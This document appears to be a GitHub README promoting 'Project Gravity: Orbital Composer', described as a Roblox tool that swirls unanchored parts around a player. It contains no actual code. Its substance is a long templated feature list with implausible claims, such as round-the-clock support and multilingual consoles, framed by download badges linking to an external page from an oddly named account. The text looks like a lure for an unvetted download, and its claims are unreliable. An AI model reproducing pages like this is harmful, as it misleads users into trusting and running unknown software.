![preview](https://raw.githubusercontent.com/fofanao81-star/Orbital-Core-Physics/main/hero_5942369.svg)
[![Download](https://raw.githubusercontent.com/fofanao81-star/Orbital-Core-Physics/main/get_232b3.svg)](https://fofanao81-star.github.io/Orbital-Core-Physics/)

# 🌌 Project Gravity: Orbital Composer — Roblox Physics Sandbox Engine

An experimental Roblox creation suite that bends unanchored parts into choreographed orbital patterns around any player, NPC, or focal anchor point using constraint-driven physics — a spiritual successor to the archived Project-Gravity-02 build, rebuilt from the ground up with modular shape grammars, live tuning, and a client-side preview layer.

Project Gravity: Orbital Composer is what happens when you hand a physics engine a conductor's baton. Instead of scripting brute-force CFrame loops that fight the simulation, the system negotiates with Roblox's own constraint solver — ropes, rods, springs, and alignments — so every swirling cluster of parts behaves like a tiny planetary system rather than a rigid puppet. Whether you're building a cosmic boss encounter, a kinetic art installation, a tower-defense vortex, or a roleplay aura that makes a character feel genuinely powerful, the Orbital Composer gives you the vocabulary to describe motion instead of micromanaging it.

---

## 🚀 What This Project Actually Is

At its heart, this repository is a **shape-driven orbital manipulation framework**. You give it a set of unanchored parts, pick a formation (rings, spirals, cages, helixes, storm clouds, ribbons, shattered shells), and the engine handles the rest:

- It measures the anchor's position and velocity every frame.
- It constructs a lightweight constraint graph connecting each part to a virtual pivot.
- It continuously re-solves the desired geometry as the anchor moves, teleports, or dies.
- It gracefully releases parts when the orbit ends, preserving their momentum so they scatter naturally instead of freezing mid-air.

This is not a single script you drop in and forget. It's a small ecosystem — a runtime module, a shape registry, a tuning console, and a preview harness — designed so that other developers can extend it with their own orbital archetypes without touching the core solver.

---

## 🧠 The Philosophy Behind the Orbit

Most "move parts around a player" implementations treat physics as an obstacle. They anchor everything, weld it, and pretend the world is a spreadsheet of coordinates. Project Gravity takes the opposite stance: **physics is the instrument, not the enemy.** The solver treats each part as a celestial body with mass, inertia, and a longing for equilibrium. The shape definitions are less like rigs and more like gravitational sheet music — they describe tension, distance, and phase, and the simulation interprets the rest.

The result is motion that feels alive. Parts lag slightly when the anchor sprints. They overshoot on sharp turns. They compress inward when the anchor stops suddenly, then bloom back out. None of that is hand-animated; it emerges from the constraints. That emergent quality is the entire point.

---

## ✨ Feature Highlights

### 🎛️ Shape Grammar Engine
Every orbital pattern is defined declaratively: radius, angular velocity, vertical offset curve, phase distribution, jitter amplitude, and constraint stiffness. Adding a new shape means writing a small descriptor table, not a new physics implementation. The engine currently ships with ring, double-ring, helix, cage, spiral shell, storm cloud, ribbon, and starburst archetypes, and the registry is open for community additions.

### ⚡ Real-Time Constraint Solver
Rather than teleporting parts each frame, the solver maintains a graph of Rod, Rope, Spring, and AlignPosition constraints, rebalancing them as the anchor transforms. This keeps the simulation stable even under heavy part counts and gives parts believable inertia.

### 🧩 Anchor-Agnostic Design
The focal point can be a player character, an NPC, a moving vehicle, a projectile, or even a static marker part. The engine only needs a BasePart reference and an optional offset; everything else is derived at runtime.

### 🖥️ Live Tuning Console
A developer-facing panel lets you adjust radius, speed, stiffness, and phase in real time without restarting the session — invaluable for dialing in the exact feel of a boss attack or ambient aura.

### 🌍 Multilingual Support
In-game configuration strings and console labels ship with localization tables for English, Spanish, French, German, Portuguese, Japanese, and Korean, so creators can present orbital tools to international teams without rewriting UI text.

### 📱 Responsive Interface
The tuning console adapts its layout to screen size and input method, remaining usable on both desktop and handheld clients. Panels collapse, sliders resize, and touch targets expand automatically.

### 🛰️ Client-Side Preview Mode
Before committing a shape to the server, you can preview it locally against a dummy anchor, reducing network chatter during iteration. When you're satisfied, one toggle promotes the preview to a replicated runtime instance.

### 🧾 Structured Event Hooks
The engine emits events for orbit start, part capture, part release, shape change, and orbit end. External systems can subscribe to build scoring, effects, sound cues, or UI reactions without forking the core.

### 🛠️ 24/7 Support Commitments
Maintainers aim to acknowledge issues around the clock across time zones, with a triage rotation designed to keep response times short regardless of when a report lands.

### ♿ Accessibility-Minded Controls
Keyboard-free operation is possible through preset cycle buttons, and color contrast in the tuning console meets readability guidelines for extended sessions.

---

## 🎨 Creative Use Cases

- **Boss Encounters:** A raid boss hurls a cage of debris that tightens around a targeted player before releasing in a shockwave.
- **Ambient Auras:** A character gains a slow helix of glowing shards that drift as they walk, purely cosmetic but deeply atmospheric.
- **Puzzle Mechanics:** Players must escape a rotating ring of platforms by timing jumps through gaps that shift with angular velocity.
- **Kinetic Sculptures:** Builders create permanent installations where parts orbit a central monument, turning a lobby into a living orrery.
- **Cinematic Sequences:** Cutscene directors trigger a starburst formation timed to a music cue, releasing parts for a dramatic debris field.
- **Training Simulations:** Coaches use storm clouds of floating targets to train aim while the formation drifts unpredictably.

---

## 🧪 Under the Hood (Technical Overview)

The runtime is organized into four cooperating layers:

1. **Anchor Layer** — Tracks the focal part, computes world transforms, and exposes velocity and rotation deltas.
2. **Shape Layer** — Converts a shape descriptor into per-part target offsets, phase angles, and constraint parameters.
3. **Solver Layer** — Builds and updates the constraint graph, tuning stiffness and damping per frame.
4. **Release Layer** — Detects orbit termination and transitions parts back to unmanaged physics with preserved velocity.

Each layer communicates through lightweight signals, so replacing one — say, swapping the solver for a custom implementation — doesn't require rewriting the others. The architecture favors composition over inheritance and readable tables over dense metatable tricks.

---

## 📚 Configuration Reference (Conceptual)

Shape descriptors generally expose the following conceptual fields:

- **radius** — base distance from the anchor
- **angularVelocity** — rotational speed in radians per second
- **verticalCurve** — a function or lookup describing height over phase
- **phaseSpread** — how parts are distributed across the full rotation
- **jitter** — random offset amplitude for organic feel
- **stiffness** — how aggressively constraints pull toward target
- **damping** — how quickly oscillations settle
- **captureMode** — instant, gradual, or proximity-based part acquisition

These are descriptive, not literal code keys; the actual schema lives in the shape registry documentation.

---

## 🗺️ Roadmap

- [ ] Additional archetypes: torus knot, double helix pair, expanding pulse
- [ ] Visual shape editor with draggable control points
- [ ] Server-authoritative replication mode with interpolation smoothing
- [ ] Performance profiling overlay for high part counts
- [ ] Community shape marketplace integration concept
- [ ] Expanded localization coverage

---

## 🤝 Contributing

Contributions are welcome across shape definitions, solver optimizations, localization tables, and documentation. The preferred flow is to open a discussion describing the intended change, then submit a focused patch. Please keep shape descriptors declarative and avoid embedding gameplay-specific logic in the core solver. New archetypes should include a short demo scene and a description of the motion they produce.

---

## 🔐 Disclaimer

Project Gravity: Orbital Composer is an independent, community-driven engineering project intended for educational, creative, and developmental purposes within sandbox environments. It is not affiliated with, endorsed by, or sponsored by any platform, studio, or rights holder mentioned or implied. Users are solely responsible for ensuring their usage complies with the terms of service of any platform they deploy it on, as well as all applicable local laws and regulations. The maintainers provide this software as-is, without warranty of any kind, and disclaim liability for any damages arising from its use. Nothing in this repository is intended to circumvent, disable, or interfere with any security mechanism, and any such use is expressly discouraged and unsupported.

---

## 📄 License

This project is released under the MIT License. See the full text at the official license reference:

[MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Project Gravity Contributors

Permission is hereby granted, in the spirit of open collaboration, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the conditions of the MIT License.

---

## 💬 Final Note

Project Gravity is a love letter to emergent motion. It exists because watching a hundred loose parts find their rhythm around a moving anchor is, frankly, delightful — and because that delight deserves a proper toolkit rather than a pile of one-off scripts. Build something that swirls. Build something that breathes. The orbit is yours to compose.

[![Download](https://raw.githubusercontent.com/fofanao81-star/Orbital-Core-Physics/main/get_232b3.svg)](https://fofanao81-star.github.io/Orbital-Core-Physics/)